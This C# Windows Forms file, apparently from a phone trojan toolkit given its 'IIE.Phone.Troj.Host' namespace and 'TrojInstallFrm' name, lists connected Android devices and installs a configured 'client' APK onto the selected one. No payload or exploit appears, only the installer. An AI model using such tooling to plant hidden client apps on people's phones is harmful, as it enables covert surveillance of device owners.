using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using WangAn.Device.Phone;

namespace IIE.Phone.Troj.Host
{
    public partial class TrojInstallFrm : Form
    {
        private readonly IConfig config;
        private readonly IDevicesManager devicesManager;
        private IEnumerable<IAndroidDevice> devices;
        public TrojInstallFrm(IConfig config, IDevicesManager devicesManager)
        {
            this.config = config;
            this.devicesManager = devicesManager;
            InitializeComponent();
            devicesManager.PhoneChanged += devicesManager_PhoneChanged;
            InitDevicesList();
            lbCommit.Text = string.Empty;
        }

        void devicesManager_PhoneChanged(object sender, StateChangedEventArgs e)
        {
            Invoke(new MethodInvoker(InitDevicesList));
        }

        private void InitDevicesList()
        {
            devices = devicesManager.GetAndroidDevices();
            foreach (var androidDevice in devices)
            {
                cbDevices.Items.Add(string.Format("{0}({1})", androidDevice.Model,androidDevice.SerialNum));
            }
        }

        private void btnInstall_Click(object sender, System.EventArgs e)
        {
            if (cbDevices.SelectedIndex >= 0 && devices.Count() > cbDevices.SelectedIndex)
            {
                var androidDevice = devices.ToList()[cbDevices.SelectedIndex];
                lbCommit.Text = "正在安装客户端，请稍后...";
                string installMsg;
                ;
                if (androidDevice.InstallApp(config.ClientApkPath, out installMsg) )
                {
                    lbCommit.Text = "安装成功";
                }
                else
                {
                    lbCommit.Text = installMsg;
                }
            }
        }

        private void cbDevices_SelectedIndexChanged(object sender, System.EventArgs e)
        {
            lbCommit.Text = string.Empty;
        }
    }
}
